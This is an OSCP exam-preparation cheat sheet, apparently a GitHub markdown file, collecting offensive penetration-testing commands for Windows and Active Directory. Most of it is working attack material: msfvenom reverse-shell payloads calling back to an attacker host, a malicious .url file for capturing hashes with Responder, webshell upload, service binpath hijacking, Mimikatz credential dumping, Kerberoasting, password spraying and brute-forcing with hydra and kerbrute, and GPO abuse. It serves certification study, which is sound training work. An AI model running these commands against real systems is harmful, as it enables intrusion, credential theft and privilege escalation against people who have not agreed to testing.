# OSCP Commands Cheat Sheet

Passed the 2023 version of the OSCP, these commands were gathered throughout practicing for the exam.


## Nmap Scans and Inital Enumeration

### Regular scans to do on every system:

`sudo nmap -sC -sV -T4 -Pn -oN nmapscan1.txt $ip` 

`sudo nmap -A -T4 -Pn -oN nmapscan2.txt $ip` 

`sudo nmap -p- -Pn -T5 -oN portscan.txt $ip` 

**UDP scan**

`sudo nmap -sU -sV -oN udpscan.txt --version-intensity 0 -F -n $ip`

if SNMP is open try SNMP walk


### **Enum4linux**

`enum4linux <IP>`

### LDAP

`nmap -sV --script “ldap* and not brute” <IP>`

### Scanning through a Pivot

`sudo proxychains nmap -vvv -sT --top-ports=60 -Pn -n $ip`

Scanning for win-rm and mssql

`proxychains nmap -vvv -sT -p 5985,5986,1433 -Pn -n $ip`

If its real down bad and slow

`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL <Filename>.txt <IP>`****

### Scanning for Vulnerabilities

smb scan:

`nmap -T5 -sV --script 'smb-vuln*' <IP>`

Very rare but just a common vuln scan:

`nmap -T5 -sU --top-ports 10000 <IP>`

# Windows Commands + Reminders / Priv esc

msfvenom quick shell:  

`msfvenom -p windows/shell/reverse_tcp LHOST=<hostIP> LPORT=<port> -f exe -o revshell.exe` 

### Usefull commands / Enumeration:

CMD

`whoami /groups`

`netstat -ano`

To list all active network connections we can use netstat11 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection (Powershell)

`Get-LocalUser`

`Get-LocalGroup` or `Get-LocalGroupMember <group-name>`

`route print`

All 32 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

All 64 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

Files belonging to users (Powershell):

`Get-ChildItem -Path C:\Users\<username>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Currently running processes (Powershell):

`Get-Process`

History of powershell of user and path (Powershell):

`(Get-PSReadlineOption).HistorySavePath`

Restart a service (Powershell): 

`Restart-Service -Name "<ServiceName>”`

Add color to windows GUI cmd for winpeas 

`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

---

## Initial access reminders

**Check out LDAP scan always**

`enum4linux <IP>`

**LDAP SHIT and ldapsearch**

nmap enum info from ldap such as usernames and passwords

`nmap -sV --script “ldap* and not brute” <IP>`

can find usernames and possibly hints about where to go next with descripion of each account you get

`ldapsearch -x -b "DC=<dn>,DC=<dn>" "*" -H ldap://<IP> > <filename>.txt`

grep for `sAMAccountName` and `descriptions` 

**Responder**

If i can upload and download or delete anything in a SMBSHARE try running responder and doing so and see if hash of null session is recieved

`responder -I tun0 -v`

if hash is not grabbed from responder but we have write perms try making a .icon file

First make `.url` file

`touch <filename>.url` && `nano <filename>.url`

make the file like soo

```python
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<IpOfResponsder>\%USERNAME%.icon
IconIndex=1
```

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/d8c82d06-5a91-4c61-9176-b1a345af52c8)

IP can be found in repsonder output, Example below on responder while running

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f23d133f-8da0-436b-9920-c813cb05f491)

connect to SMB share and upload `.url` file

`put <filename>.url`

snag all the hashes and crack with `hashcat` or basic `John` command

`john <HashFile> /usr/share/wordlist/rockyou.txt` 

**Cadaver**

if WebDav is enabled on Web Server and have creds, can use `cadaver` to upload rev shell

scan to see if WebDav is enabled 

`nmap --script http-webdav-scan -p <WebServicePort> <IP>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/089e33e2-27c0-4473-aff7-ae72d618bac9)

Run Cadaver

`cadaver http://http://192.168.228.122/<IP>`

upload webshell (If IIS service upload aspx rev shell from the `/usr/share/webshells/aspx/cmdasp.aspx` directyory)

`put <Path-to-Webshell>`

Navigate to webshell in Web Browser and should be all good

---

### **Connecting to box with creds**

ssh with ssh key

`ssh -i <id_rsaKeyName> <IP>`

PsExec

`impacket-psexec <domain>/<username>:<password>@<IP>`

WinRM

`evil-winrm -i 10.10.135.154 -u Administrator -p hghgib6vHT3bVWf`

MSSQL

`impacket-mssqlclient -p 1433 <Username>[@](mailto:sql_svc@10.10.88.148)<IP> -windows-auth`

### Switch to user with creds and NO GUI

`runas /user:<username> cmd`


---

### Enumerating Service on windows box

Query Config of sevice

`sc.exe qc <name>`

Query current status of service

`sc.exe query <name>`

Modify config of service 

`sc.exe config <name> <option>= <value>`

Start/Stop service

`net start <name>`

`net stop <name>`

Get owner and access controls on service/script/file in powershell:

`Get-ACL <filename/path> | fl`

---

## Windows Priv Esc

**ALWAYS CHECK TokenZ**

`whoami /priv`

Use `PrintSpoofer` or `GodPotato` if `SeImpersonatePrivilege`

(https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

**Cached Credentials**

`cmdkey /list`

**Binary Hijacking and DLL hijacking**

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

**Unquoted Service Path’s**

`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""”`

**Scheduled tasks**

`schtasks /query /fo LIST /v`

`schtasks /query /v /fo LIST | findstr /i "<username>*”`

`Get-ScheduledTask`

**Check AlwaysInstallElevated Registry**

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` if returns with `0x1` make an MSI, it'll run as SYSTEM OR winpeas output

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/fdedcc3f-9a15-4ea1-b493-a7ea31353932)

- then on kali

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi`

- finally on target

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

********Check installed applications********

- Run winpeas process-info and searchsploit interesting applications

`.\winPEASx64.exe quiet processinfo`

- or 

`.\seatbelt.exe NonstandardProcesses`

**Check for Windows backup files in C:\ directory**

**Check powershell history files**

`(Get-PSReadlineOption).HistorySavePath`

- Check it out manually by going to this path 

`C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`

**Check for database files**

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

**Check for useful files in User's directory**

`Get-ChildItem -Path C:\Users\<Filename>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,.log,.kdbx,.xml -File -Recurse -ErrorAction SilentlyContinue`

`Get-ChildItem -Path C:\Users\<Username> -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

`.log` `.kdbx` `.xml` literally any weird files in user's directory

**Check for XAMP path for databases:**

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

**Check env variables for passwords and such**

- outputs env variables:

`set`

**Finally run Winpeas + check for Vulnerable installed software and POWERUP**

**Weak Registry Perms from winPEAS**

- in winPEAS look for this vuln (next to list of vulnerable services)

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/47799c17-8d8a-4530-bf41-772c727aada5)

- Next open a powershell prompt and check permissions on groups, see if current user is in group

`Get-Acl <Registry_Path> | Format-List`

- If user is in group with RW, Full or Management cntrls, check if user can restart service in any way

checking for auto-start on restart
`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}`

- or just `net stop` or `net start` and see if you can

- Next run `sc qc <service_name>` and look for “BINARY_PATH_NAME”

`sc qc <service_name>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/39ebbe57-b8f0-4423-af23-794cdc71893c)

- Finally, change binpath to reverse shell transferred onto the device

`sc config <name> binpath= "\"C:\Windows\Temp\<reverse_shell>"”`

**Check installed packages**

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

**Always Check for symlinks exploit**

**SharpGPOabuse (For AD environments/machines)**

- If we have “all” access to edit GPO’s (we can check with powerview) we can used SharpGPOabuse to escalate pirvs

- To start `transfer PowerView.ps1 to the target system` and `run "powershell" in shell on target`

- Next start `PowerView.ps1`

`.\PowerView.ps1` 

- In PowerView run and copy the “`Id`”

`Get-GPO -Name “Default Domain Policy”`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/284ce537-e6e9-4032-baad-02ce350eefa6)

- With the Id and in `PowerView.ps1` run this command

`Get-GPPermission -Guid <Id> -TargetType User -TargetName <CurruentUsername>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f3e4bec8-ee58-46ee-a5b6-fbb114082715)

- If permissions are set as the same above (`GpoEditDeleteModiySecuirty`) Transfer Sharp (Download .exe here: https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

then run `ShapGPOAbuse.exe`

`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "Default Domain Policy"`

- then update the GPO

`gpupdate /force`

- check if user is admin

`net user <username>`

DONE!@#$

### Great lil cheat sheet

https://github.com/isch1zo/Windows-PrivEsc-cheatsheat

---


# Active Directory Magic

## Checklist

### 00. Scanning

`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL int_hosts.txt`

### 01. Getting Users and Groups

- What users belong to groups that allow remote management? (RDP, winRM)

### On Windows (Depends on Domain Policies)

### Net

- `net user /domain` all users in domain
- `net user username /domain` information on a domain user
- `net group /domain`
- `net group groupname /domain`
- `nltest /dclist:<domain>` find domain controller (not for OSCP)

### PowerView

[Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet) **Test for SID you control with *genericall* on another user/group**

(Great Guide https://cybergladius.com/htb-walkthrough-support/)

- `Get-ObjectAcl -Identity "<UsernameOrGRoup>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
- `"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID`
    - `net user username newpassword /domain`

**Kerberoastable Users**

- `Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname`

**Computers in the domain**

- `Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem`

**List groups**

- `Get-NetGroup -Domain internal.msp.local | select name`

**Members of a group**

- `Get-DomainGroupMember "Domain Admins" -Recurse`

**Current User Info**

Searches environment for other machines user has access to log into

- `Find-LocalAdminAccess`

Find shares on Network

- `Find-DomainShare`

### On Kali

### SMB

### Creds:

- `cme smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --users`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --rid-brute`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --groups`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-users`
- `crackmapexec smb <IP> -u 'Administrator' -p 'PASS' --local-auth --sam`

### LDAP

### Creds:

`ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`

### RPC

### No Creds:

`rpcclient -U "" -N <IP>`

### Creds:

`rpcclient -U "medtech.com/wario%Mushroom!" <IP>`

---

### 02. Searching for Passwords

### On Windows

### Mimikatz [cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)

**Requires admin permissions**

- `privilege::debug` `token::elevate`
- `sekurlsa::logonpasswords`
    - `ekeys` `credman` `wdigest`
- `lsadump::sam`
    - `secrets`
- `.\mimikatz.exe "token::elevate" "lsadump::secrets" exit`

### Rubeus

**Requires admin permissions** **Kerberoasting**

- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
- `sudo hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt --force`
- **AS-REP Roasting**
- `.\Rubeus.exe asreproast /nowrap`
- `sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force`
- `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Cached Credentials

**Database Files**

- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- `keepass2john Database.kdbx > Keepasshash.txt`
- `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`
- Move the database to `~/keepass` and interact with `kpcli`
- 

**PowerShell history**

- `Get-History`
- `(Get-PSReadlineOption).HistorySavePath`
- `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)

**Interesting Files**

- `cmdkey /list`
- In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- `sysprep.*` `unattend.*`
- `Group Policies` `gpp-decrypt <hash>`

### On Kali

### LDAP

- `ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
- `ldapsearch -x -H ldap://<IP> -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`

### SMB

- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-auth --shares`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --sessions`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --lusers`

### SNMP

- `sudo nmap -sU -p 161 --script snmp-brute <IP>`
- `sudo nmap -sU -p 161 --script snmp-win32-users <IP>`
- `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>`
- `snmpwalk -v 1 -c public 192.168.194.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`
- `snmpwalk -v2c -c public 192.168.194.149 | grep <string>`
    - STRING
    - USER
    - PASSWORD
    - hrSWRunParameters
    - i "login|fail"
    - `E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`

### Impacket

### Kerberos

`impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile hashes.kerb`

### AS-REP Roast

`impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile dave.hash`

---

### 03. Compile

- Make a list of users
    - make sure to differentiate `local` and `domain` users!
- Make a list of hashes and passwords or anything you think might be a password
    - `domain_hashes.txt`
    - `domain_passwords.txt`
- Check the `password policy` to make sure you're not locking yourself out
    - **On Windows:**`net accounts /domain`
    - **On Kali:** `cme smb 172.16.10.10 --pass-pol` (Might need valid creds)

---

### 04. SPRAY EVERYTHING

- specify with and without domain
- [[[Pass the Hash]]](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)

### Kerberos

**Password Spray** `proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc <IP> -vvv` 

**Bruteforce** `proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc <IP> -vvv`

### SMB

`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt -d medtech.com --continue-on-success`

`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt --continue-on-success`

`cme smb <IP> -u users.txt -H '<HASH>' --continue-on-success`

`cme smb <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth`

### RDP

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://<IP>:3389 -u -vV -T 40 -I`

`hydra -V -f -L users.txt -P passwords.txt rdp://<IP> -u -vV -T 40 -I`

### WinRM

`evil-winrm -i <IP> -u jeffadmin -p 'password'`

`evil-winrm -i <IP> -u jeffadmin -H 'HASH'`

### FTP

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://<IP>:21 -u -vV -T 40 -I`

### SSH

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://<IP>:22 -u -vV -T 40 -I`

## SMB Server (Windows)

If you can't move file from Kali to the internal network, you can create a new share on DMZ.

- Need Administrator+ on **M1**
- Make sure to transfer the files into C:\temp you want to host

**On M1:** `mkdir C:\temp`

`New-SmbSHare -Name 'temp' -Path 'C:\temp' -FullAccess everyone`

**On M2:** `net use \\<IP>\temp`

`copy \\10.10.10.20\temp\nc.exe C:\nc.exe`

# SMB

**Start SMB share**

`sudo impacket-smbserver -smb2support test MS01`


**Nmap scan for vulns**

`sudo n*map -T5 -sV --script 'smb-vuln*' <IP>`

**List shares:**

`smbclient -L \\<IP>\ -N`

`crackmapexec smb <IP> -u '' “ -p '' “ --shares`

`smbmap -H <IP> -R`

`smbmap -H <IP> -u df`

**connect with no creds:**

`smbclient //<IP>/<sharename> -U ""%""`

`smbclient //<IP>/<sharename> -N`

**RPC** 

- if no password required SMB/try in general:

`rpcclient -U  '' -N <IP>`

- then run this to list users

`enumdomusers`

- or groups

`enumdomgroups`

- and query # user in groups:

`querygroup <rid #>`
